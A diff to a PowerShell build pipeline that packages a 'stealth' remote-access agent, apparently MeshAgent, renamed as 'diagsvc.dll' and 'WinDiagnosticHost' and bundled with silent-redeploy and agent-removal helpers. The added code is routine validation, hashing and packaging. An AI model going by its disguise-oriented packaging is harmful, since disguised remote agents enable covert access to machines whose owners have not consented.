@@ -1,7 +1,8 @@
 #Requires -RunAsAdministrator
 param(
     [switch]$Clean = $false,
-    [switch]$SkipBuild = $false
+    [switch]$SkipBuild = $false,
+    [switch]$StrictBranding = $false
 )
 
 Set-StrictMode -Version Latest
@@ -57,11 +58,44 @@ function Assert-SignedArtifact {
 $projectRoot   = $PSScriptRoot
 $msbuildPath   = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
 $projectFile   = Join-Path $projectRoot "meshservice\MeshService-2022.vcxproj"
+$brandingHeader = Join-Path $projectRoot "meshcore\generated\meshagent_branding.h"
+$schemaPath    = Join-Path $projectRoot "schema\meshagent.schema.json"
 $configuration = "StealthLab_DLL"
 $platform      = "x64"
 $dllOutput     = Join-Path $projectRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
 $outputDir     = Join-Path $projectRoot "dist"
 $toolsDir      = Join-Path $projectRoot "tools"
+$outDir        = Join-Path $projectRoot "out"
+$buildOutDir   = Join-Path $outDir "build"
+$script:brandingReportPath = Join-Path $buildOutDir "branding_diff_report.json"
+$script:brandingWarningCount = 0
+$script:verificationDir = $null
+
+# Clean up old distribution artifacts (keep only 3 most recent)
+$maxBuildsToKeep = 3
+if (Test-Path $outputDir) {
+    Write-Host "[INFO] Cleaning old distribution artifacts..." -ForegroundColor Yellow
+    $oldBuilds = Get-ChildItem -Path $outputDir -Directory -Filter "MeshAgent_Stealth_*" |
+                 Sort-Object CreationTime -Descending |
+                 Select-Object -Skip $maxBuildsToKeep
+
+    if ($oldBuilds) {
+        foreach ($oldBuild in $oldBuilds) {
+            Write-Host "    - Removing old build: $($oldBuild.Name)" -ForegroundColor DarkGray
+            Remove-Item -Path $oldBuild.FullName -Recurse -Force
+        }
+
+        # Also remove associated ZIP files
+        $oldZips = Get-ChildItem -Path $outputDir -File -Filter "MeshAgent_Stealth_*.zip" |
+                   Sort-Object CreationTime -Descending |
+                   Select-Object -Skip $maxBuildsToKeep
+
+        foreach ($oldZip in $oldZips) {
+            Write-Host "    - Removing old ZIP: $($oldZip.Name)" -ForegroundColor DarkGray
+            Remove-Item -Path $oldZip.FullName -Force
+        }
+    }
+}
 $embedScript   = Join-Path $toolsDir "embed_provisioning_simple.ps1"
 $dumpbinPath   = "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\dumpbin.exe"
 
@@ -74,6 +108,7 @@ $AllowedThumbprints = Get-MeshAgentAllowedThumbprints -RepoRoot $projectRoot
 
 
 . (Join-Path $toolsDir "ResourceProbe.ps1")
+$validateBrandingScript = Join-Path $toolsDir "validate_branding_config.ps1"
 
 if (-not (Test-Path $msbuildPath)) {
     throw "MSBuild not found at '$msbuildPath'. Install Visual Studio build tools or update path."
@@ -90,14 +125,25 @@ if (-not (Test-Path $embedScript)) {
 Write-Header "MeshAgent Complete Build Pipeline"
 
 $step = 1
-$totalSteps = 7
+$totalSteps = 10
 $buildStopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+$script:brandingHeaderStampUtc = $null
 
 Write-Step -Index ($step++) -Total $totalSteps -Label "Embedding provisioning data" -Action {
     Push-Location $toolsDir
     try {
+        if (Test-Path $validateBrandingScript) {
+            & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $validateBrandingScript -ConfigPath (Join-Path $projectRoot "branding_config.json") -SchemaPath $schemaPath -Quiet
+            if ($LASTEXITCODE -ne 0) { throw "Branding configuration validation failed." }
+        } else {
+            Write-Note "Branding validation script missing; skipping schema checks" ([ConsoleColor]::DarkYellow)
+        }
         & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $embedScript
         Write-Note "Provisioning data embedded successfully" ([ConsoleColor]::Green)
+        if (-not (Test-Path $brandingHeader)) {
+            throw "Branding header expected at $brandingHeader after embedding."
+        }
+        $script:brandingHeaderStampUtc = (Get-Item $brandingHeader).LastWriteTimeUtc
     }
     finally {
         Pop-Location
@@ -118,6 +164,14 @@ Write-Step -Index ($step++) -Total $totalSteps -Label "Building stealth DLL" -Ac
     if ($SkipBuild) {
         Write-Note "Skipped (use without -SkipBuild to compile)"
         return
+    }
+
+    # Validate branding header timestamp to prevent stale builds
+    if (Test-Path $dllOutput) {
+        $dllTime = (Get-Item $dllOutput).LastWriteTimeUtc
+        if ($script:brandingHeaderStampUtc -and $script:brandingHeaderStampUtc -lt $dllTime) {
+            throw "Branding header ($($script:brandingHeaderStampUtc.ToString('yyyy-MM-dd HH:mm:ss'))) is older than existing DLL ($($dllTime.ToString('yyyy-MM-dd HH:mm:ss'))). Provisioning data may be stale. Clean the build or regenerate provisioning."
+        }
     }
 
     $buildTimer = [System.Diagnostics.Stopwatch]::StartNew()
@@ -148,6 +202,9 @@ Write-Step -Index ($step++) -Total $totalSteps -Label "Verifying build output" -
     $dllInfo = Get-Item $dllOutput
     Write-Note ("DLL size: {0:N0} bytes" -f $dllInfo.Length)
     Write-Note ("Timestamp: {0:u}" -f $dllInfo.LastWriteTimeUtc)
+    if ($script:brandingHeaderStampUtc -and $dllInfo.LastWriteTimeUtc -lt $script:brandingHeaderStampUtc) {
+        throw "MeshService-2022.dll timestamp predates the refreshed branding header. Re-run the build to include updated provisioning."
+    }
     Assert-SignedArtifact -Path $dllOutput -Description 'StealthLab_DLL payload'
 
     if (Test-Path $dumpbinPath) {
@@ -164,6 +221,26 @@ Write-Step -Index ($step++) -Total $totalSteps -Label "Verifying build output" -
     }
 }
 
+Write-Step -Index ($step++) -Total $totalSteps -Label "Removing previous dist packages" -Action {
+    if (-not (Test-Path $outputDir)) {
+        Write-Note "dist directory not present; nothing to purge" ([ConsoleColor]::DarkGray)
+        return
+    }
+    $existing = Get-ChildItem -Path $outputDir -Filter "MeshAgent_Stealth_*" -ErrorAction SilentlyContinue
+    if ($existing) {
+        foreach ($item in $existing) {
+            try {
+                Remove-Item -Path $item.FullName -Recurse -Force -ErrorAction Stop
+            } catch {
+                Write-Note ("Unable to remove {0}: {1}" -f $item.FullName, $_.Exception.Message) ([ConsoleColor]::Yellow)
+            }
+        }
+        Write-Note "Removed previous MeshAgent_Stealth_* packages from dist" ([ConsoleColor]::Green)
+    } else {
+        Write-Note "No prior MeshAgent_Stealth_* packages found" ([ConsoleColor]::DarkGray)
+    }
+}
+
 Write-Step -Index ($step++) -Total $totalSteps -Label "Preparing package contents" -Action {
     if (-not (Test-Path $outputDir)) {
         New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
@@ -171,6 +248,7 @@ Write-Step -Index ($step++) -Total $totalSteps -Label "Preparing package content
 
     $packageName = "MeshAgent_Stealth_{0}" -f (Get-Date -Format 'yyyyMMdd_HHmmss')
     $script:packageDir = Join-Path $outputDir $packageName
+    $script:verificationDir = Join-Path $script:packageDir "verification"
     New-Item -Path $script:packageDir -ItemType Directory -Force | Out-Null
 
     Assert-SignedArtifact -Path $dllOutput -Description 'diagsvc.dll source'
@@ -202,12 +280,19 @@ Write-Step -Index ($step++) -Total $totalSteps -Label "Preparing package content
     $optionalFiles = @(
         @{ Source = Join-Path $projectRoot "WinDiagnosticHost.msh"; Destination = "WinDiagnosticHost.msh"; Description = ".msh provisioning file" },
         @{ Source = Join-Path $projectRoot "deploy_stealth_agent.ps1"; Destination = "install.ps1"; Description = "installer helper script"; Optional = $true },
-        @{ Source = Join-Path $projectRoot "branding_config.json"; Destination = "branding_config.json"; Description = "branding configuration" }
+        @{ Source = Join-Path $projectRoot "branding_config.json"; Destination = "branding_config.json"; Description = "branding configuration" },
+        @{ Source = Join-Path $projectRoot "tools\cleanup_old_agents.ps1"; Destination = "tools\cleanup_old_agents.ps1"; Description = "endpoint cleanup helper"; Optional = $true },
+        @{ Source = Join-Path $projectRoot "tools\install_agent_bootstrap.ps1"; Destination = "tools\install_agent_bootstrap.ps1"; Description = "local force-update bootstrap"; Optional = $true }
     )
 
     foreach ($file in $optionalFiles) {
         if (Test-Path $file.Source) {
-            Copy-Item -Path $file.Source -Destination (Join-Path $script:packageDir $file.Destination) -Force
+            $destinationPath = Join-Path $script:packageDir $file.Destination
+            $destinationParent = Split-Path $destinationPath -Parent
+            if ($destinationParent -and -not (Test-Path $destinationParent)) {
+                New-Item -ItemType Directory -Path $destinationParent -Force | Out-Null
+            }
+            Copy-Item -Path $file.Source -Destination $destinationPath -Force
             Write-Note ("Added {0}" -f $file.Description)
         }
         elseif (-not $file.Optional) {
@@ -243,6 +328,8 @@ FILES
 - MeshService64.exe        : svchost-enabled service executable (x64)
 ${win32ReadmeLine}- WinDiagnosticHost.msh    : Provisioning data
 - install.ps1              : Optional local installer helper
+- tools\cleanup_old_agents.ps1 : Aggressive legacy agent removal helper
+- tools\install_agent_bootstrap.ps1 : Optional silent redeploy bootstrap
 - branding_config.json     : Branding configuration used for the build
 
 "@
@@ -251,12 +338,245 @@ ${win32ReadmeLine}- WinDiagnosticHost.msh    : Provisioning data
     Write-Note ("Package directory: {0}" -f $script:packageDir)
 }
 
-Write-Step -Index ($step++) -Total $totalSteps -Label "Generating checksum" -Action {
-    $dllPath = Join-Path $script:packageDir "diagsvc.dll"
-    $hash = (Get-FileHash -Path $dllPath -Algorithm SHA256).Hash
-    "SHA256(diagsvc.dll) = $hash" | Out-File -FilePath (Join-Path $script:packageDir "checksums.txt") -Encoding UTF8
-    $script:dllHash = $hash
-    Write-Note ("SHA256: {0}..." -f $hash.Substring(0, 16))
+Write-Step -Index ($step++) -Total $totalSteps -Label "Running verification suite" -Action {
+    $testScript = Join-Path $projectRoot "test.ps1"
+    $verificationDir = $script:verificationDir
+    if (-not $verificationDir) {
+        $verificationDir = Join-Path $script:packageDir "verification"
+        $script:verificationDir = $verificationDir
+    }
+    if (-not (Test-Path $testScript)) {
+        if (-not (Test-Path $verificationDir)) {
+            New-Item -ItemType Directory -Path $verificationDir -Force | Out-Null
+        }
+        $skipLog = Join-Path $verificationDir "verify-log.txt"
+        Write-Note "test.ps1 not found; skipping automated verification" ([ConsoleColor]::DarkYellow)
+        "Verification skipped: test.ps1 not found" | Out-File -FilePath $skipLog -Encoding UTF8
+        return
+    }
+
+    if (-not (Test-Path $verificationDir)) {
+        New-Item -ItemType Directory -Path $verificationDir -Force | Out-Null
+    }
+
+    $verificationLog = Join-Path $verificationDir "verify-log.txt"
+    $verificationReport = Join-Path $verificationDir "verify-report.json"
+
+    $testArgs = @(
+        '-NoProfile',
+        '-ExecutionPolicy','Bypass',
+        '-File', $testScript,
+        '-BinaryPath', $script:packageDir,
+        '-ReportPath', $verificationReport
+    )
+    Write-Note "Executing regression tests against packaged binaries"
+    & powershell.exe $testArgs 2>&1 | Tee-Object -FilePath $verificationLog | Out-Null
+    if ($LASTEXITCODE -ne 0) {
+        throw "Regression tests failed. See verification/verify-log.txt for details."
+    }
+    Write-Note ("Verification artifacts written to {0}" -f ($verificationDir.Substring($projectRoot.Length).TrimStart('\','/'))) ([ConsoleColor]::Green)
+}
+
+Write-Step -Index ($step++) -Total $totalSteps -Label "Analyzing branding drift" -Action {
+    if (-not (Test-Path $script:packageDir)) {
+        Write-Note "Package directory missing; skipping branding drift analysis" ([ConsoleColor]::DarkYellow)
+        return
+    }
+
+    if (-not (Test-Path $validateBrandingScript)) {
+        Write-Note "Branding validation script missing; skipping branding drift analysis" ([ConsoleColor]::DarkYellow)
+        return
+    }
+
+    $binaryCandidates = @(
+        (Join-Path -Path $script:packageDir -ChildPath "diagsvc.dll")
+        (Join-Path -Path $script:packageDir -ChildPath "MeshService64.exe")
+        (Join-Path -Path $script:packageDir -ChildPath "MeshService.exe")
+        (Join-Path -Path $script:packageDir -ChildPath "MeshServiceHost64.dll")
+    )
+
+    $existingBinaries = @()
+    foreach ($candidate in $binaryCandidates) {
+        if (Test-Path $candidate) {
+            $existingBinaries += $candidate
+        }
+    }
+
+    if ($existingBinaries.Count -eq 0) {
+        Write-Note "No binaries staged for branding drift analysis" ([ConsoleColor]::DarkGray)
+        return
+    }
+
+    if (-not (Test-Path $buildOutDir)) {
+        New-Item -ItemType Directory -Path $buildOutDir -Force | Out-Null
+    }
+
+    $binaryArg = [string]::Join(';', $existingBinaries)
+
+    $validationArgs = @(
+        '-NoProfile',
+        '-ExecutionPolicy','Bypass',
+        '-File', $validateBrandingScript,
+        '-ConfigPath', (Join-Path $projectRoot "branding_config.json"),
+        '-SchemaPath', $schemaPath,
+        '-Quiet',
+        '-ReportPath', $script:brandingReportPath,
+        '-BinaryPaths', $binaryArg
+    )
+
+    & powershell.exe $validationArgs
+    if ($LASTEXITCODE -ne 0) {
+        throw "Branding drift validation failed."
+    }
+
+    $warningCount = 0
+    if (Test-Path $script:brandingReportPath) {
+        try {
+            $report = Get-Content -Path $script:brandingReportPath -Raw | ConvertFrom-Json -Depth 6
+            if ($report -and $report.warningCount) {
+                $warningCount = [int]$report.warningCount
+            }
+        } catch {
+            Write-Note ("Unable to parse branding diff report: {0}" -f $_.Exception.Message) ([ConsoleColor]::DarkYellow)
+        }
+
+        $script:brandingWarningCount = $warningCount
+
+        $verificationDir = $script:verificationDir
+        if (-not $verificationDir) {
+            $verificationDir = Join-Path $script:packageDir "verification"
+            $script:verificationDir = $verificationDir
+        }
+        if (-not (Test-Path $verificationDir)) {
+            New-Item -ItemType Directory -Path $verificationDir -Force | Out-Null
+        }
+
+        Copy-Item -Path $script:brandingReportPath -Destination (Join-Path $verificationDir "branding_diff_report.json") -Force
+
+        $relativeReport = if ($script:brandingReportPath.StartsWith($projectRoot)) {
+            $script:brandingReportPath.Substring($projectRoot.Length).TrimStart('\','/')
+        } else {
+            $script:brandingReportPath
+        }
+        Write-Note ("Branding diff report captured at {0}" -f $relativeReport) ([ConsoleColor]::Green)
+    } else {
+        Write-Note "Branding diff report not produced; skipping copy to verification artifacts" ([ConsoleColor]::DarkYellow)
+    }
+
+    if ($warningCount -gt 0) {
+        Write-Note ("Branding drift warnings detected: {0}" -f $warningCount) ([ConsoleColor]::DarkYellow)
+        if ($StrictBranding) {
+            throw ("Branding drift detected ({0} warning(s))." -f $warningCount)
+        }
+    } else {
+        Write-Note "Branding drift checks passed (no warnings)" ([ConsoleColor]::Green)
+    }
+}
+
+Write-Step -Index ($step++) -Total $totalSteps -Label "Computing bundle digest" -Action {
+    if (-not (Test-Path $script:packageDir)) {
+        throw "Package directory missing: $script:packageDir"
+    }
+
+    $bundleName = Split-Path -Path $script:packageDir -Leaf
+    $files = Get-ChildItem -Path $script:packageDir -File -Recurse | Sort-Object FullName
+    if (-not $files) {
+        throw "No files found in package directory $script:packageDir"
+    }
+
+    $digestLines = New-Object System.Collections.Generic.List[string]
+    $manifest = [ordered]@{
+        bundle = $bundleName
+        createdUtc = (Get-Date).ToUniversalTime().ToString("o")
+        packageDir = $script:packageDir
+        signerEnforcement = [bool]$script:MeshAgentEnforceSigning
+        files = @()
+    }
+    $signerWarnings = New-Object System.Collections.Generic.List[string]
+
+    foreach ($file in $files) {
+        $relativePath = $file.FullName.Substring($script:packageDir.Length + 1)
+        $normalizedPath = $relativePath -replace '\\','/'
+        $hash = (Get-FileHash -Path $file.FullName -Algorithm SHA256).Hash
+        $digestLines.Add("{0} *{1}" -f $hash, $normalizedPath)
+
+        $entry = [ordered]@{
+            path = $normalizedPath
+            size = [int64]$file.Length
+            sha256 = $hash
+        }
+
+        if ($file.Extension -match '(?i)\.(dll|exe)$') {
+            $enforce = [bool]$script:MeshAgentEnforceSigning
+            $thumbprint = $null
+            if ($enforce) {
+                try {
+                    Assert-MeshAgentSignatureAllowed -Path $file.FullName -AllowedThumbprints $AllowedThumbprints -RequireSignature:$true | Out-Null
+                    $thumbprint = Get-MeshAgentSignerThumbprint -Path $file.FullName
+                    if (-not $thumbprint) {
+                        throw "Signer thumbprint unavailable after enforcement check."
+                    }
+                    $entry['signatureStatus'] = "allowlisted"
+                } catch {
+                    $signerWarnings.Add("Signature enforcement failure for ${normalizedPath}: $($_.Exception.Message)")
+                    throw
+                }
+            } else {
+                try {
+                    $thumbprint = Get-MeshAgentSignerThumbprint -Path $file.FullName
+                } catch {
+                    $signerWarnings.Add("Signature inspection failed for ${normalizedPath}: $($_.Exception.Message)")
+                }
+
+                if ($thumbprint) {
+                    if ($AllowedThumbprints -and -not ($AllowedThumbprints -contains $thumbprint)) {
+                        $signerWarnings.Add("Signer $thumbprint for ${normalizedPath} not in allowlist")
+                        $entry['signatureStatus'] = "signed-unlisted"
+                    } else {
+                        $entry['signatureStatus'] = "allowlisted"
+                    }
+                } else {
+                    $entry['signatureStatus'] = "unsigned"
+                    $signerWarnings.Add("Unsigned binary: ${normalizedPath}")
+                }
+            }
+
+            if ($thumbprint) {
+                $entry['signed'] = $true
+                $entry['signerThumbprint'] = $thumbprint
+            } else {
+                $entry['signed'] = $false
+            }
+        }
+
+        $manifest.files += [PSCustomObject]$entry
+
+        if ($normalizedPath -ieq "diagsvc.dll") {
+            $script:dllHash = $hash
+        }
+    }
+
+    if ($signerWarnings.Count -gt 0) {
+        $manifest['signerWarnings'] = $signerWarnings
+    }
+
+    $bundleDigestName = "{0}.sha256" -f $bundleName
+    $bundleManifestName = "{0}-manifest.json" -f $bundleName
+    $digestPath = Join-Path $script:packageDir $bundleDigestName
+    $manifestPath = Join-Path $script:packageDir $bundleManifestName
+
+    $digestLines | Out-File -FilePath $digestPath -Encoding ASCII
+    $manifest | ConvertTo-Json -Depth 6 | Out-File -FilePath $manifestPath -Encoding UTF8
+
+    Copy-Item -Path $digestPath -Destination (Join-Path $outputDir $bundleDigestName) -Force
+    Copy-Item -Path $manifestPath -Destination (Join-Path $outputDir $bundleManifestName) -Force
+
+    Write-Note ("Digest catalogued {0} files" -f $files.Count) ([ConsoleColor]::Green)
+    if ($signerWarnings.Count -gt 0 -and -not $script:MeshAgentEnforceSigning) {
+        foreach ($warning in $signerWarnings) {
+            Write-Note ("Signer warning: {0}" -f $warning) ([ConsoleColor]::DarkYellow)
+        }
+    }
 }
 
 Write-Step -Index ($step++) -Total $totalSteps -Label "Creating archive" -Action {
@@ -279,6 +599,12 @@ Write-Host ("Archive        : {0}" -f $script:zipPath) -ForegroundColor Cyan
 Write-Host ("Elapsed time   : {0:N1}s" -f $buildStopwatch.Elapsed.TotalSeconds) -ForegroundColor Cyan
 if ($script:dllHash) {
     Write-Host ("DLL SHA256     : {0}" -f $script:dllHash) -ForegroundColor Gray
+}
+if ($script:brandingWarningCount -gt 0) {
+    Write-Host ("Branding warnings: {0}" -f $script:brandingWarningCount) -ForegroundColor Yellow
+    if (-not $StrictBranding) {
+        Write-Host "Re-run with -StrictBranding to treat branding drift as an error." -ForegroundColor DarkYellow
+    }
 }
 Write-Host ""
 Write-Host "Next steps:" -ForegroundColor Yellow
